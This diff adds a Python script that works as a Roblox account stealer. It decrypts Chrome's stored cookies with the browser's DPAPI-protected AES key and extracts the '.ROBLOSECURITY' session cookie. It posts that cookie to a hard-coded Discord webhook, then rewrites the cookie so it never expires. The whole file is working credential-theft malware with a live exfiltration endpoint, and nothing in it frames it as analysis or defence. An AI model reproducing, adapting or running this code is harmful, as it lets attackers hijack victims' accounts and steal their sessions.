@@ -1,0 +1,96 @@
+import os
+import json
+import base64
+import sqlite3
+from datetime import datetime, timedelta
+import win32crypt
+from Crypto.Cipher import AES
+import requests
+
+def get_chrome_datetime(chromedate):
+    if chromedate != 86400000000 and chromedate:
+        try:
+            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+        except Exception as e:
+            print(f"Error: {e}, chromedate: {chromedate}")
+            return chromedate
+    else:
+        return ""
+
+def get_encryption_key():
+    local_state_path = ".\\Local State"
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = f.read()
+        local_state = json.loads(local_state)
+
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    key = key[5:]
+    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+
+def decrypt_data(data, key):
+    try:
+        iv = data[3:15]
+        data = data[15:]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        return cipher.decrypt(data)[:-16].decode()
+    except:
+        try:
+            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
+        except:
+            return ""
+
+def find_files():
+    result = []
+    for file in os.listdir(".\\"):
+        if file.startswith("Cookies"):
+            result.append(os.path.join(os.path.abspath(os.getcwd()) + "\\", file))
+    return result
+
+def main():
+    r = find_files()
+    for e in r:
+        print(e)
+        filename = e
+        db = sqlite3.connect(filename)
+        db.text_factory = lambda b: b.decode(errors="ignore")
+        cursor = db.cursor()
+        cursor.execute(f"""
+SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
+FROM cookies
+WHERE host_key like '%roblox.com%' AND name like '%ROBLOSECURITY%'""")
+
+        key = get_encryption_key()
+        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
+            if not value:
+                decrypted_value = decrypt_data(encrypted_value, key)
+            else:
+                decrypted_value = value
+
+            data = {
+                "content": "",
+                "username": "cockie",
+            }
+
+            data["embeds"] = [
+                {
+                    "description" : decrypted_value,
+                    "title" : f"cookie ^"
+                }
+            ]
+
+            url = f"https://ptb.discord.com/api/webhooks/963958790011637801/ihWSzl7TJoTh3zjnGQ48s1py90pSzn1A2Q29RMUiUwF-1FhJ8vaHgh1paextIHBHiuHY"
+            #urlopen(Request("https://ptb.discord.com/api/webhooks/963958790011637801/ihWSzl7TJoTh3zjnGQ48s1py90pSzn1A2Q29RMUiUwF-1FhJ8vaHgh1paextIHBHiuHY", data=json.dumps(webhook).encode(), headers=getheaders()))
+            result = requests.post(url, json = data)
+
+            result.raise_for_status()
+
+
+            cursor.execute("""UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
+            WHERE host_key = ?
+            AND name = ?""", (decrypted_value, host_key, name))
+        db.commit()
+        db.close()
+
+if __name__ == "__main__":
+    main()
